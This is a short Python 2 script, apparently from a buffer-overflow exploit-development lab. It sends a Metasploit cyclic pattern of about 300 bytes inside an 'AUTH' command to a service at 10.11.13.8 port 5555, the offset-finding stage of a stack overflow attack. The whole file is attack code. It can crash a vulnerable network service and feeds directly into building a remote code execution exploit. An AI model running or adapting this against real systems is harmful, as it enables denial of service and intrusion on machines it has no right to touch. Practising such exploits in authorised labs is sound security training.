import socket
import sys

#/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300 > pattern

Buffer= "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"

try:
    print "Sending pattern.."
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connenct = s.connect(("10.11.13.8",5555))
    s.recv(1024)
    s.send('AUTH '+Buffer+'\r\n')
    s.close()
except:
    print "Connection error!"
